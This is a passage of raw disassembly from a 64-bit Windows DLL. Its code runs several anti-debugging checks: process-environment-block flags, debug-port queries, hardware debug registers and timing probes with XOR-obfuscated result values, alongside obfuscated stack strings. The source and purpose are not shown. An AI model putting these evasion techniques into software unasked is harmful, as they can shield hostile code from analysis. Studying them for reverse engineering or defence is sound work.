   1800050a1:	c7 45 c7 4b 00 06 00 	movl   $0x6004b,-0x39(%rbp)
   1800050a8:	c7 45 cb 4d 00 46 00 	movl   $0x46004d,-0x35(%rbp)
   1800050af:	c7 45 cf 47 00 2c 00 	movl   $0x2c0047,-0x31(%rbp)
   1800050b6:	66 0f 6f 0d 42 00 3a 	movdqa 0x3a0042(%rip),%xmm1        # 0x1803a5100
   1800050bd:	00 
   1800050be:	c7 45 a7 7e 51 58 59 	movl   $0x5958517e,-0x59(%rbp)
   1800050c5:	66 c7 45 ab 45 41    	movw   $0x4145,-0x55(%rbp)
   1800050cb:	0f 11 45 06          	movups %xmm0,0x6(%rbp)
   1800050cf:	89 45 16             	mov    %eax,0x16(%rbp)
   1800050d2:	66 89 45 1a          	mov    %ax,0x1a(%rbp)
   1800050d6:	88 45 1c             	mov    %al,0x1c(%rbp)
   1800050d9:	0f 11 4d ef          	movups %xmm1,-0x11(%rbp)
   1800050dd:	8b 45 a7             	mov    -0x59(%rbp),%eax
   1800050e0:	89 45 ff             	mov    %eax,-0x1(%rbp)
   1800050e3:	0f b7 45 ab          	movzwl -0x55(%rbp),%eax
   1800050e7:	66 89 45 03          	mov    %ax,0x3(%rbp)
   1800050eb:	c6 45 05 39          	movb   $0x39,0x5(%rbp)
   1800050ef:	48 8d 4d bf          	lea    -0x41(%rbp),%rcx
   1800050f3:	e8 c8 93 00 00       	call   0x18000e4c0
   1800050f8:	48 8b c8             	mov    %rax,%rcx
   1800050fb:	ff 15 57 10 02 00    	call   *0x21057(%rip)        # 0x180026158
   180005101:	48 8b f8             	mov    %rax,%rdi
   180005104:	48 85 c0             	test   %rax,%rax
   180005107:	75 1c                	jne    0x180005125
   180005109:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180005110:	c6 44 05 06 00       	movb   $0x0,0x6(%rbp,%rax,1)
   180005115:	48 ff c0             	inc    %rax
   180005118:	48 83 f8 17          	cmp    $0x17,%rax
   18000511c:	72 f2                	jb     0x180005110
   18000511e:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   180005123:	eb 59                	jmp    0x18000517e
   180005125:	48 8d 4d ef          	lea    -0x11(%rbp),%rcx
   180005129:	e8 22 8e 00 00       	call   0x18000df50
   18000512e:	48 8b d0             	mov    %rax,%rdx
   180005131:	48 8b cf             	mov    %rdi,%rcx
   180005134:	ff 15 f6 0f 02 00    	call   *0x20ff6(%rip)        # 0x180026130
   18000513a:	48 85 c0             	test   %rax,%rax
   18000513d:	75 16                	jne    0x180005155
   18000513f:	90                   	nop
   180005140:	c6 44 05 06 00       	movb   $0x0,0x6(%rbp,%rax,1)
   180005145:	48 ff c0             	inc    %rax
   180005148:	48 83 f8 17          	cmp    $0x17,%rax
   18000514c:	72 f2                	jb     0x180005140
   18000514e:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   180005153:	eb 29                	jmp    0x18000517e
   180005155:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   18000515a:	44 8b cb             	mov    %ebx,%r9d
   18000515d:	4c 8d 45 e7          	lea    -0x19(%rbp),%r8
   180005161:	48 8d 55 b7          	lea    -0x49(%rbp),%rdx
   180005165:	49 8b ce             	mov    %r14,%rcx
   180005168:	ff d0                	call   *%rax
   18000516a:	8b d0                	mov    %eax,%edx
   18000516c:	33 c0                	xor    %eax,%eax
   18000516e:	66 90                	xchg   %ax,%ax
   180005170:	c6 44 05 06 00       	movb   $0x0,0x6(%rbp,%rax,1)
   180005175:	48 ff c0             	inc    %rax
   180005178:	48 83 f8 17          	cmp    $0x17,%rax
   18000517c:	72 f2                	jb     0x180005170
   18000517e:	b9 14 00 00 00       	mov    $0x14,%ecx
   180005183:	33 c0                	xor    %eax,%eax
   180005185:	48 8d 7d d3          	lea    -0x2d(%rbp),%rdi
   180005189:	f3 aa                	rep stos %al,(%rdi)
   18000518b:	f7 d2                	not    %edx
   18000518d:	c1 ea 1f             	shr    $0x1f,%edx
   180005190:	8b c2                	mov    %edx,%eax
   180005192:	48 8b 4d 1f          	mov    0x1f(%rbp),%rcx
   180005196:	48 33 cc             	xor    %rsp,%rcx
   180005199:	e8 12 9a 00 00       	call   0x18000ebb0
   18000519e:	48 81 c4 c0 00 00 00 	add    $0xc0,%rsp
   1800051a5:	41 5f                	pop    %r15
   1800051a7:	41 5e                	pop    %r14
   1800051a9:	41 5c                	pop    %r12
   1800051ab:	5f                   	pop    %rdi
   1800051ac:	5e                   	pop    %rsi
   1800051ad:	5b                   	pop    %rbx
   1800051ae:	5d                   	pop    %rbp
   1800051af:	c3                   	ret
   1800051b0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800051b5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1800051ba:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1800051bf:	55                   	push   %rbp
   1800051c0:	48 8d ac 24 c0 fb ff 	lea    -0x440(%rsp),%rbp
   1800051c7:	ff 
   1800051c8:	48 81 ec 40 05 00 00 	sub    $0x540,%rsp
   1800051cf:	48 8b 05 2a 3e 3a 00 	mov    0x3a3e2a(%rip),%rax        # 0x1803a9000
   1800051d6:	48 33 c4             	xor    %rsp,%rax
   1800051d9:	48 89 85 30 04 00 00 	mov    %rax,0x430(%rbp)
   1800051e0:	65 48 8b 0c 25 60 00 	mov    %gs:0x60,%rcx
   1800051e7:	00 00 
   1800051e9:	33 ff                	xor    %edi,%edi
   1800051eb:	8b f7                	mov    %edi,%esi
   1800051ed:	40 38 71 02          	cmp    %sil,0x2(%rcx)
   1800051f1:	75 2b                	jne    0x18000521e
   1800051f3:	48 b8 03 2b d1 c4 71 	movabs $0x3f5a8e71c4d12b03,%rax
   1800051fa:	8e 5a 3f 
   1800051fd:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180005202:	48 b8 92 ad 25 26 a4 	movabs $0x98e94fa42625ad92,%rax
   180005209:	4f e9 98 
   18000520c:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   180005211:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180005216:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   18000521b:	48 33 f0             	xor    %rax,%rsi
   18000521e:	f6 81 bc 00 00 00 70 	testb  $0x70,0xbc(%rcx)
   180005225:	75 2e                	jne    0x180005255
   180005227:	48 b8 10 f4 b3 58 a6 	movabs $0x7d9ec2a658b3f410,%rax
   18000522e:	c2 9e 7d 
   180005231:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   180005236:	48 b8 d6 41 64 5b 37 	movabs $0x33b148375b6441d6,%rax
   18000523d:	48 b1 33 
   180005240:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180005245:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   18000524a:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   18000524f:	48 33 c8             	xor    %rax,%rcx
   180005252:	48 33 f1             	xor    %rcx,%rsi
   180005255:	48 89 7c 24 40       	mov    %rdi,0x40(%rsp)
   18000525a:	ff 15 c8 0d 02 00    	call   *0x20dc8(%rip)        # 0x180026028
   180005260:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   180005265:	ba 07 00 00 00       	mov    $0x7,%edx
   18000526a:	48 8b c8             	mov    %rax,%rcx
   18000526d:	e8 5e f8 ff ff       	call   0x180004ad0
   180005272:	48 39 7c 24 40       	cmp    %rdi,0x40(%rsp)
   180005277:	75 2e                	jne    0x1800052a7
   180005279:	48 b8 ce 52 6b d8 19 	movabs $0xe4a73f19d86b52ce,%rax
   180005280:	3f a7 e4 
   180005283:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   180005288:	48 b8 44 3d 26 f3 1e 	movabs $0x7564da1ef3263d44,%rax
   18000528f:	da 64 75 
   180005292:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180005297:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   18000529c:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   1800052a1:	48 33 c8             	xor    %rax,%rcx
   1800052a4:	48 33 f1             	xor    %rcx,%rsi
   1800052a7:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   1800052ac:	ff 15 76 0d 02 00    	call   *0x20d76(%rip)        # 0x180026028
   1800052b2:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   1800052b7:	ba 1e 00 00 00       	mov    $0x1e,%edx
   1800052bc:	48 8b c8             	mov    %rax,%rcx
   1800052bf:	e8 0c f8 ff ff       	call   0x180004ad0
   1800052c4:	85 c0                	test   %eax,%eax
   1800052c6:	74 2e                	je     0x1800052f6
   1800052c8:	48 b8 b9 05 d3 a2 f7 	movabs $0x18c4e6f7a2d305b9,%rax
   1800052cf:	e6 c4 18 
   1800052d2:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1800052d7:	48 b8 0a 94 ac ff cc 	movabs $0xcd33ffccffac940a,%rax
   1800052de:	ff 33 cd 
   1800052e1:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1800052e6:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1800052eb:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   1800052f0:	48 33 c8             	xor    %rax,%rcx
   1800052f3:	48 33 f1             	xor    %rcx,%rsi
   1800052f6:	33 d2                	xor    %edx,%edx
   1800052f8:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1800052fd:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   180005303:	e8 68 ed 01 00       	call   0x180024070
   180005308:	48 8b 1d 89 59 3a 00 	mov    0x3a5989(%rip),%rbx        # 0x1803aac98
   18000530f:	c7 45 90 10 00 10 00 	movl   $0x100010,-0x70(%rbp)
   180005316:	ff 15 cc 0d 02 00    	call   *0x20dcc(%rip)        # 0x1800260e8
   18000531c:	48 8b c8             	mov    %rax,%rcx
   18000531f:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   180005324:	ff d3                	call   *%rbx
   180005326:	85 c0                	test   %eax,%eax
   180005328:	74 18                	je     0x180005342
   18000532a:	48 39 7d a8          	cmp    %rdi,-0x58(%rbp)
   18000532e:	75 40                	jne    0x180005370
   180005330:	48 39 7d b0          	cmp    %rdi,-0x50(%rbp)
   180005334:	75 3a                	jne    0x180005370
   180005336:	48 39 7d b8          	cmp    %rdi,-0x48(%rbp)
   18000533a:	75 34                	jne    0x180005370
   18000533c:	48 39 7d c0          	cmp    %rdi,-0x40(%rbp)
   180005340:	75 2e                	jne    0x180005370
   180005342:	48 b8 2f bd a4 c0 89 	movabs $0x5e617389c0a4bd2f,%rax
   180005349:	73 61 5e 
   18000534c:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180005351:	48 b8 f0 26 f3 d3 09 	movabs $0x742d1d09d3f326f0,%rax
   180005358:	1d 2d 74 
   18000535b:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   180005360:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   180005365:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   18000536a:	48 33 c8             	xor    %rax,%rcx
   18000536d:	48 33 f1             	xor    %rcx,%rsi
   180005370:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   180005375:	ff 15 f5 0d 02 00    	call   *0x20df5(%rip)        # 0x180026170
   18000537b:	8b cf                	mov    %edi,%ecx
   18000537d:	89 7c 24 40          	mov    %edi,0x40(%rsp)
   180005381:	8b 44 24 40          	mov    0x40(%rsp),%eax
   180005385:	03 c1                	add    %ecx,%eax
   180005387:	ff c1                	inc    %ecx
   180005389:	89 44 24 40          	mov    %eax,0x40(%rsp)
   18000538d:	83 f9 64             	cmp    $0x64,%ecx
   180005390:	7c ef                	jl     0x180005381
   180005392:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   180005397:	ff 15 d3 0d 02 00    	call   *0x20dd3(%rip)        # 0x180026170
   18000539d:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1800053a2:	ff 15 48 0d 02 00    	call   *0x20d48(%rip)        # 0x1800260f0
   1800053a8:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   1800053ad:	0f 57 d2             	xorps  %xmm2,%xmm2
   1800053b0:	48 2b 44 24 48       	sub    0x48(%rsp),%rax
   1800053b5:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800053b8:	f2 48 0f 2a 44 24 50 	cvtsi2sdq 0x50(%rsp),%xmm0
   1800053bf:	f2 0f 10 0d f9 f6 39 	movsd  0x39f6f9(%rip),%xmm1        # 0x1803a4ac0
   1800053c6:	00 
   1800053c7:	f2 48 0f 2a d0       	cvtsi2sd %rax,%xmm2
   1800053cc:	f2 0f 5e d0          	divsd  %xmm0,%xmm2
   1800053d0:	66 0f 2f ca          	comisd %xmm2,%xmm1
   1800053d4:	72 2e                	jb     0x180005404
   1800053d6:	48 b8 98 7a 56 b1 e3 	movabs $0xf2c840e3b1567a98,%rax
   1800053dd:	40 c8 f2 
   1800053e0:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1800053e5:	48 b8 b5 71 c8 cd b9 	movabs $0x79d57fb9cdc871b5,%rax
   1800053ec:	7f d5 79 
   1800053ef:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1800053f4:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   1800053f9:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   1800053fe:	48 33 c8             	xor    %rax,%rcx
   180005401:	48 33 f1             	xor    %rcx,%rsi
   180005404:	0f 31                	rdtsc
   180005406:	48 c1 e2 20          	shl    $0x20,%rdx
   18000540a:	48 0b c2             	or     %rdx,%rax
   18000540d:	89 7c 24 40          	mov    %edi,0x40(%rsp)
   180005411:	4c 8b c0             	mov    %rax,%r8
   180005414:	8b 4c 24 40          	mov    0x40(%rsp),%ecx
   180005418:	03 cf                	add    %edi,%ecx
   18000541a:	ff c7                	inc    %edi
   18000541c:	89 4c 24 40          	mov    %ecx,0x40(%rsp)
   180005420:	81 ff f4 01 00 00    	cmp    $0x1f4,%edi
   180005426:	7c ec                	jl     0x180005414
   180005428:	0f 31                	rdtsc
   18000542a:	48 c1 e2 20          	shl    $0x20,%rdx
   18000542e:	48 0b c2             	or     %rdx,%rax
   180005431:	49 2b c0             	sub    %r8,%rax
   180005434:	48 3d 40 0d 03 00    	cmp    $0x30d40,%rax
   18000543a:	73 30                	jae    0x18000546c
   18000543c:	48 b8 c6 d2 0b 4f 8e 	movabs $0x63a9178e4f0bd2c6,%rax
   180005443:	17 a9 63 
   180005446:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   18000544b:	48 b8 89 ff 07 d1 f4 	movabs $0x7c944cf4d107ff89,%rax
   180005452:	4c 94 7c 
   180005455:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
